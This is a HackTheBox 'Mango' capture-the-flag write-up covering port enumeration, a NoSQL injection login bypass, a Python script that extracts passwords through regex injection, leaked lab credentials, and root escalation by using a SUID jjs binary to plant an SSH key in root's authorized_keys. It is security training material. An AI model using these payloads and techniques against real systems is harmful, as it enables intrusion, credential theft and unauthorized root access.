---
layout: post
title: 'HackTheBox - Mango : writeup '
date: 2024-08-08 15:34 +0000
categories: writeup
tags:
- cybersecurity
- hackthebox
- CTF
- pentest
---

## Port scan

![port scan](/assets/img/HTB-Mango/port-scan.png)

## Enumeration

### Port 80

![port 80 overwiew in the browser](/assets/img/HTB-Mango/port80.png)

### Port 443

- [https://10.10.10.162/](https://10.10.10.162/)
![port 443 overview in the browser](/assets/img/HTB-Mango/port443.png)


- Go to [http://staging-order.mango.htb](http://staging-order.mango.htb)
![other host](/assets/img/HTB-Mango/staging-order.png)

- Perform auth bypass (Ref: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass) )

```
username[$ne]=cedo&password[$ne]=cedo&login=login

```
- We are redirected to home.php
![home page](/assets/img/HTB-Mango/home-page.png)

>Document databases
 store data in documents similar to  JSON (JavaScript Object Notation) objects.  Each document contains pairs
 of fields and values. The values can typically be a variety of types including things like strings, numbers, booleans, arrays, or objects, and their structures typically align with objects developers are working
 with in code. Because of their variety of field value types and powerful query languages, document databases are great for a wide variety of use cases and can be used as a general purpose database.  
They can horizontally scale-out to accommodate large data volumes.  
MongoDB is consistently ranked as the world’s most popular NoSQL database according to [DB-engines](https://db-engines.com/en/ranking)
 and is an example of a document database. For more on document databases, visit [What is a Document Database?](https://www.mongodb.com/document-databases)

### Dump users and password with NoSQL Injection

```bash
#Users enum
python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep username -op login:login -m POST
#Password enum
python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb/ -up username -pp password -ep password -op login:login -m POST
```

```python
#!/usr/bin/env python3

import re
import requests
import string

chars = string.ascii_letters + string.digits + string.punctuation

print(f"Charset {chars}")

url = "http://staging-order.mango.htb/"
p = ""

while True:
    print(p)
    for x in chars:
        data = {
            "username": "admin",
            "password[$regex]": f"^{re.escape(p+x)}.*$",
            "login": "login"
        }
        r = requests.post(url, data=data, proxies={"http":"127.0.0.1:8080"}, allow_redirects=False)
        if r.status_code == 302:
            p += x
            break
```

- Ran the script and found :

![usernames found](/assets/img/HTB-Mango/usernames.png)

![passwords found](/assets/img/HTB-Mango/passwords.png)

```
Users
admin,mango
Passwords
h3mXK8RhU~f{]f5H
t9KcS3>!0B#2
```
### Initial access
- Try to connect via ssh
    - `mango:h3mXK8RhU~f{]f5H` works !
    - switch to admin later with the remaining password and get user.txt content

![Access to ssh](/assets/img/HTB-Mango/access-to-ssh.png)

## Privesc to root

- Check SUID files
- Found this `/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs` (with the help of LinEnum)

![SUID Check](/assets/img/HTB-Mango/Suid-check.png)

- Exploitation

![SUID Exploitation Hint](/assets/img/HTB-Mango/Suid-exploitation-hint.png)

- Tried the payload without success
    - We have the shell but unable to write
    
    ![Shell](/assets/img/HTB-Mango/shell.png)
    
- Since we have permission to log as root, we can send our public key directly as one line command

![SSH Configuration](/assets/img/HTB-Mango/ssh-config.png)

- Write your public at /root/.ssh/authorized_keys

```bash
var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1OzJZblJQXygx+CYt5vDAPIehKwlXU0hxvFxOj+OJ9BA0Modmmgvylj8T4O0Y4jxVwtZ+86zcYDJGiSz91D01LvGUkKq4QuEO5XnMjKK0efdaaJRjv4hesn56aEM8YXOL5KZYHVmk+I1bkxDcfinMhaCebWktUuEsKSPejWTRZ/fnExqmxxtdZmGCj99K/arLmHKrEgnhESoU3pgtBEuX0L3YH+FwVK6ytVNLTYQpUzNmiwxKCASCkQaF6Af9fqk73NFDRusQtE5brsqvV6K+9fkl2hFyo++KK8ar7v47TJCg4K8TxHnsFTmCNq6uPl+MgDZPXOrS5C08k5d1lJBcm1j7x/G2EvC0+35dXvfxszd/kG7PwGrt0s7PvTOsyMZPUTIrxIbj4b2266nK89YI+e+9YbuMBIoSa+X7nh0qFfIK62SCfgWMMIlLgwG/KkWDkey2l/qcNn2TsDOSTXTmn61zJte2LSoI59jq+3qEC7RGj7pKulrjotuC5hDnIZ8= kali@kali");
fw.close();
```

![Exploitation](/assets/img/HTB-Mango/exploitation.png)

- Now connect as root via ssh without any password

![Access to root user](/assets/img/HTB-Mango/root-access.png)